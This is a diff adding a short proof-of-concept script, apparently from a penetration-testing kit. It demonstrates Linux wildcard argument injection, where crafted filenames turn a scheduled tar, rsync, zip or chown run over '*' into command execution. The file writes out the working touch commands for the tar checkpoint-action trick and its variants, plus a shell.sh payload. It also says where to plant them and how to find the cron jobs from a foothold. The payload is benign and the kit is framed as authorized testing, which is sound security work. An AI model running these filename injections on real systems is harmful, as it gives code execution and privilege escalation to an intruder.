@@ -1,0 +1,27 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# Linux wildcard/argument injection via FILENAMES (the tar --checkpoint trick).
+# Authorized testing only. Benign marker discipline.
+#
+# WHAT THIS DEMONSTRATES: cron/backup jobs running tar/rsync/zip/chown with a
+# bare * over a directory where you control FILENAMES. Filenames become
+# ARGUMENTS - no separators, no quotes, nothing a WAF sees.
+#
+# WHERE TO USE: upload/export/temp dirs processed by scheduled jobs (find the
+# job: crontab -l / /etc/cron* / pspy on an authorized foothold).
+#
+# FILES TO CREATE (the whole attack is these filenames):
+touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
+# shell.sh content (BENIGN):
+echo 'id; echo "Safe PoC -> x8bitranjit"' > shell.sh
+# next scheduled `tar cf backup.tar *` executes your command as the job user.
+#
+# VARIANTS:
+#   rsync:  touch -- '-e sh shell.sh'
+#   tar:    touch -- '--to-command=id'
+#   zip:    touch -- '-TT' 'sh -c id'   (7z/zip differ - check binary)
+#   chown:  touch -- '--reference=/etc/shadow'
+#
+# CONFIRM: OOB callback / marker in next job cycle (or job log). CLEANUP:
+# delete the crafted filenames + shell.sh, ledger it (PEXP-015).
+# KIT CROSS-REF: CMDI-017.
